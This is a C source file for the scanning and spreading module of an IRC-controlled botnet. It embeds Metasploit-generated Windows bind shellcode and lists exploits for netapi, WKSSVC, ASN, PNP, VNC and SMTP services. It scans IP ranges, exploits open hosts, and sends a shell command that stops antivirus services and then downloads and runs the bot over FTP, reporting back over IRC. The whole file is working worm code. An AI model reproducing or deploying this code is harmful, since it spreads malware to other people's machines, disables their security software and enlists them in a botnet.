#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_ADVSCAN

//bind shellcode

/* win32_bind -  EXITFUNC=seh LPORT=6236 Size=342 Encoder=PexFnstenvMov http://metasploit.com */
char bindshell[] =
"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfb\x8c\x27"
"\x94\x83\xeb\xfc\xe2\xf4\x07\xe6\xcc\xd9\x13\x75\xd8\x6b\x04\xec"
"\xac\xf8\xdf\xa8\xac\xd1\xc7\x07\x5b\x91\x83\x8d\xc8\x1f\xb4\x94"
"\xac\xcb\xdb\x8d\xcc\xdd\x70\xb8\xac\x95\x15\xbd\xe7\x0d\x57\x08"
"\xe7\xe0\xfc\x4d\xed\x99\xfa\x4e\xcc\x60\xc0\xd8\x03\xbc\x8e\x69"
"\xac\xcb\xdf\x8d\xcc\xf2\x70\x80\x6c\x1f\xa4\x90\x26\x7f\xf8\xa0"
"\xac\x1d\x97\xa8\x3b\xf5\x38\xbd\xfc\xf0\x70\xcf\x17\x1f\xbb\x80"
"\xac\xe4\xe7\x21\xac\xd4\xf3\xd2\x4f\x1a\xb5\x82\xcb\xc4\x04\x5a"
"\x41\xc7\x9d\xe4\x14\xa6\x93\xfb\x54\xa6\xa4\xd8\xd8\x44\x93\x47"
"\xca\x68\xc0\xdc\xd8\x42\xa4\x05\xc2\xf2\x7a\x61\x2f\x96\xae\xe6"
"\x25\x6b\x2b\xe4\xfe\x9d\x0e\x21\x70\x6b\x2d\xdf\x74\xc7\xa8\xdf"
"\x64\xc7\xb8\xdf\xd8\x44\x9d\xe4\x3f\xc8\x9d\xdf\xae\x75\x6e\xe4"
"\x83\x8e\x8b\x4b\x70\x6b\x2d\xe6\x37\xc5\xae\x73\xf7\xfc\x5f\x21"
"\x09\x7d\xac\x73\xf1\xc7\xae\x73\xf7\xfc\x1e\xc5\xa1\xdd\xac\x73"
"\xf1\xc4\xaf\xd8\x72\x6b\x2b\x1f\x4f\x73\x82\x4a\x5e\xc3\x04\x5a"
"\x72\x6b\x2b\xea\x4d\xf0\x9d\xe4\x44\xf9\x72\x69\x4d\xc4\xa2\xa5"
"\xeb\x1d\x1c\xe6\x63\x1d\x19\xbd\xe7\x67\x51\x72\x65\xb9\x05\xce"
"\x0b\x07\x76\xf6\x1f\x3f\x50\x27\x4f\xe6\x05\x3f\x31\x6b\x8e\xc8"
"\xd8\x42\xa0\xdb\x75\xc5\xaa\xdd\x4d\x95\xaa\xdd\x72\xc5\x04\x5c"
"\x4f\x39\x22\x89\xe9\xc7\x04\x5a\x4d\x6b\x04\xbb\xd8\x44\x70\xdb"
"\xdb\x17\x3f\xe8\xd8\x42\xa9\x73\xf7\xfc\x0b\x06\x23\xcb\xa8\x73"
"\xf1\x6b\x2b\x8c\x27\x94";

static int bindshellsize=sizeof(bindshell);


// globals
ADVINFO advinfo[MAX_THREADS];
CRITICAL_SECTION CriticalSection; 

EXPLOIT exploit[]={
	//new exploits
#ifndef NO_IPSWITCH
{"smtp",	"smtp",	25,	ipswitch,	0, TRUE}, 
#endif //NO_IPSWITCH
#ifndef NO_NETAPI2
	{"n2139",	"netapi139-2",	139,	netapi2,	0, TRUE}, 
	{"n2445",	"netapi445-2",	445,	netapi2,	0, TRUE},
#endif //NO_NETAPI2

#ifndef NO_NETAPI
	{"netapi139",	"netapi139",	139,	netapi,	0, TRUE}, 
	{"netapi445",	"netapi445",	445,	netapi,	0, TRUE},
#endif
#ifndef NO_VNC
	{"vnc",	"vnc",	5900,	VNCExploit,	0, TRUE},
#endif

    //old exploits
#ifndef NO_ASN
	{"asn",	"asn",	445,	ASN,	0, TRUE},
#endif
#ifndef NO_PNP
	{"pnp",	"pnp",	445,	PNP,	0, TRUE},
#endif
#ifndef NO_WKSSVC
	//wkssvc
	{"wksvce",	"WKSSVCE",	445,	wkssvce,	0, TRUE},
	{"wksvco",	"WKSSVCO",	445,	wkssvco,	0, TRUE},
	{"wksvc2",	"WKSSVC2",	445,	wkssvc2,	0, TRUE},
	{"wksvce139","WKSSVCE139", 139,	wkssvce,	0, TRUE},
	{"wksvco139","WKSSVCO139", 139,	wkssvco,	0, TRUE},
	{"wksvc2139","WKSSVC2139", 139,	wkssvc2,	0, TRUE},
#endif
//	{name,		display name, port,	function, stats, enable ftp},
	{NULL, NULL, 0, NULL, 0, FALSE}
};

SCANALL scanall[]={
	{"n2139", true},
	{"n2445", true},
	{"vnc", true},
};
#ifndef NO_NTPASS
SCANALL ntscan[]={
	{"wksvc2139", true},
	{"wksvc2",  true},
};
#endif
#ifndef NO_WKSSVC
SCANALL wksescan[]={
	{"wksvce", true},
	{"wksvce139",  true},
};
SCANALL wksoscan[]={
	{"wksvco", true},
	{"wksvco139",  true},
};
int wksescansize=(sizeof(wksescan)/sizeof(SCANALL));
int wksoscansize=(sizeof(wksoscan)/sizeof(SCANALL));
#endif

int scanallsize=(sizeof(scanall)/sizeof(SCANALL));
#ifndef NO_NTPASS
int ntscansize=(sizeof(ntscan)/sizeof(SCANALL));
#endif
void ListExploitStats(void *conn, char *target, BOOL verbose, int total)
{
	IRC* irc=(IRC*)conn;
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "%s Exploit Statistics:", scan_title);
	for(int i=0; exploit[i].port != 0; i++)
	{
		if (lstrcmpi(exploit[i].name,"banner"))
		{
			extotal += exploit[i].stats;
			sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
			strncat(buffer, buffer2, sizeof(buffer));
		}
	}
	//extotal += eftpsends;
	sprintf(buffer2, " Exploit FTPD: %d, Total: %d.", eftpsends, extotal);
	strncat(buffer, buffer2, sizeof(buffer));

	if (extotal > total)
		irc->privmsg(target,buffer);
	else
	{
		if (verbose) 
			irc->privmsg(target,buffer);
	}
	return;
}

BOOL ConnectShell(EXINFO exinfo, unsigned int connectport)
{
	int len;
	char recvbuf[1024];
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip);
	shell_addr.sin_port = fhtons(connectport);

	if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;
	if (fconnect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return FALSE;

	char mkdir_buff[400];

	len = frecv(sockfd, recvbuf, 1024, 0);

	char fname[_MAX_FNAME];
	sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	_snprintf(mkdir_buff,sizeof(mkdir_buff),

		//both of these are modified to stop mcshield and norton antivirus BEFORE the exe is on the system.
		//i disabled ftpip for this but origninally it had the option.

/*#ifndef NO_FTPIP
		"net stop \"Security Center\" &net stop navapsvc &net stop kavsvc &net stop McAfeeFramework &net stop NOD32krn &net stop McShield &net stop \"Symantec AntiVirus\" &net stop \"Norton AntiVirus Server\" &echo open %s %s > i&echo user 1 1 >> i &echo get %s >> i &echo quit >> i &ftp -As:i &%s &exit\r\n",
		ftpip,ftpipport,filename,filename); //this uses settings from config.
#endif*/
//#ifdef NO_FTPIP
	    "net stop \"Security Center\" &net stop navapsvc &net stop kavsvc &net stop McAfeeFramework &net stop NOD32krn &net stop McShield &net stop \"Symantec AntiVirus\" &net stop \"Norton AntiVirus Server\" &echo open %s %s > i&echo user 1 1 >> i &echo get %s >> i &echo quit >> i &ftp -As:i &%s &exit\r\n",
		(PrivateIP(exinfo.ip)?inip:exip),FTP_PORT,filename,filename); //this uses the bots built-in ftpd.
//#endif
	if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);

	if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	len = frecv(sockfd, recvbuf, 1024, 0);
	fclosesocket(sockfd);
	return TRUE;
}

char *MakeIP(char *ip,BOOL Random,int Class)
{
	if(!ip)
		return NULL;

	static char retip[16];
	ZeroMemory(retip,sizeof(retip));

	char *tokens[4];
	char ipbuf[16];
	strncpy(ipbuf,ip,16);
	tokens[0]=strtok(ipbuf,".");
	if(!tokens[0])
		return NULL;
	for(int i=1;i<4;i++) {
		tokens[i]=strtok(NULL,".");
		if(!tokens[i])
			return NULL;
	}
	if (Class==1) //A Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],(Random?"x":"0"),(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==2) //B Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==3) //C Class
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],tokens[2],(Random?"x":"0"));

	else
	{
		return NULL;
	}

	/*int ip1=-1,ip2=-1,ip3=-1,ip4=-1;
	if (strlen(ip) > 15) 
		return NULL;
	sscanf(ip,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);

	if (Class==1) //A Class
		sprintf(retip,"%s.%s.%s.%s",ip1,(Random?"x":"0"),(Random?"x":"0"),(Random?"x":"0"));

	else if (Class==2) //B Class
		sprintf(retip,"%s.%s.%s.%s",ip1,ip2,(Random?"x":"0"),(Random?"x":"0"));

	else if (Class==3) //C Class
		sprintf(retip,"%s.%s.%s.%s",ip1,ip2,ip3,(Random?"x":"0"));

	else
		return NULL;*/

	return retip;
}

void CurrentIP(void *conn, char *target, int threadnum)
{
	IRC* irc=(IRC*)conn;
	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;
		irc->privmsg(target,"%s Current IP: %s.",scan_title,finet_ntoa(in));
	} else 
		irc->privmsg(target,"%s Scan not active.",scan_title);
	return;
}

void CheckServers(ADVSCAN scan,void *conn)
{
	DWORD id;
	if(scan.exploit != -1) {
		if (exploit[scan.exploit].ftp) {
			if (findthreadid(FTPD_THREAD) == 0) {
				static FTP ftp;
				if (!staticftpd) {
					srand(GetTickCount());
					ftp.port = (rand()%48127)+1024;
				} else {
					ftp.port = ftpdport;
				}
				ftp.threads = 0;
				GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
				strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
				ftp.gotinfo=FALSE;
				strncpy(ftp.chan,scan.target,sizeof(ftp.chan)-1);
				ftp.silent=scan.silent;
				ftp.verbose=scan.verbose;
				ftp.conn=conn;
				ftp.threadnum=addthread(FTPD_THREAD,"%s Server started, Port: %i, File: %s.", ftp_title, ftp.port, ftp.filename);
				if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id)) {
					while (ftp.gotinfo == FALSE) 
						Sleep(50);
				}
			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	
	IN_ADDR in;
	in.s_addr=ip;
	//no sense scanning ourself
	if (!strcmp(finet_ntoa(in),exip) || !strcmp(finet_ntoa(in),inip))
		return FALSE;

	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	IRC* irc=(IRC*)scan.conn;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);

	//char buffer[LOGLINE]; 
	//char szSelfExe[MAX_PATH];


//	// FIX ME: Make this a standalone function
//	if (!FileExists(szLocalPayloadFile)) {
//		GetModuleFileName(0,szSelfExe,MAX_PATH);
//		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
//		// FIX ME: Make this copy to the same directory (could affect other stuff)
//	}

	CheckServers(scan,scan.conn);

	if (findthreadid(SCAN_THREAD) == 1)
	{
		DeleteCriticalSection(&CriticalSection); // just in case
		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400))
		{
			// failed to initialize CriticalSection
			if (!scan.silent)
				irc->privmsg(scan.target,"%s Failed to initialize critical section, error: <%d>",scan_title,GetLastError());
			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++)
	{
		scan.cthreadid = i;
		scan.cthreadnum = addthread(SCAN_THREAD,"%s %s:%d, Scan thread: %d, Sub-thread: %d.",scan_title,scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} else {
//			sprintf(buffer, "%s Failed to start worker thread, error: <%d>.",scan_title, GetLastError());
//			addlog(ERRORLOG,buffer);
		}

		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	if (!scan.silent && scan.verbose)
		irc->privmsg(scan.target,"%s Finished at %s:%d after %d minute(s) of scanning.",scan_title, finet_ntoa(in), scan.port, scan.minutes);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}



DWORD WINAPI AdvPortScanner(LPVOID param)
{
	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	IRC* irc=(IRC*)scan.conn;
	scanp->cgotinfo = TRUE;

	IN_ADDR in;
//	char logbuf[LOGLINE];

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP=AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP=AdvGetNextIP(threads[threadnum].parent);
		in.s_addr=dwIP;

//		sprintf(logbuf,"%s IP: %s:%d, Scan thread: %d, Sub-thread: %d.",scan_title,
//			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
//		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP,scan.port,scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				if (!scan.silent)
					irc->privmsg(scan.target,"%s Portscan: %s:%d open.",scan_title,finet_ntoa(in),scan.port);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				sprintf(exinfo.chan, scan.target);
				exinfo.silent = scan.silent;
				exinfo.verbose = scan.verbose;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(scan.target,irc,exinfo);
//				if (exploit[scan.exploit].exfunc(exinfo)) {
//					EnterCriticalSection(&CriticalSection); 
//
//					sprintf(logbuf,"[SCAN]: Finished with IP: %s, Port %d.",finet_ntoa(in),scan.port);
//					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
//					addlog(logbuf);
//	
//					LeaveCriticalSection(&CriticalSection);
//				} else {
//					EnterCriticalSection(&CriticalSection); 
//
//					sprintf(logbuf,"[SCAN]: Failed to exploit IP: %s, Port %d.",finet_ntoa(in),scan.port);
//					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
//					addlog(logbuf);
//	
//					LeaveCriticalSection(&CriticalSection);
//				}

			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(0);
}
#endif
